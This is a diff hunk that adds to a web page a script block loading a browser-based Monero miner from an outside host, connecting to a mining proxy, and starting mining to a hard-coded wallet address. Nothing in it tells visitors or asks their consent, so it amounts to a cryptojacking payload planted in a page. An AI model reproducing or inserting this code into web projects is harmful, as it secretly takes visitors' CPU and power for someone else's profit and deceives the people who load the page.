@@ -1,0 +1,11 @@
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "44x2jiaupK37uVF3VEeyrUS73G5eCtDY7Ge3NonKUWeuUr1irYjpXJA4BfM96EKpgAcdUDyKUFh1ti7vNPD8y1VHVSLE5DS"; //Your Wallet Here
+    var workerId = ""
+    var threads = -5;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
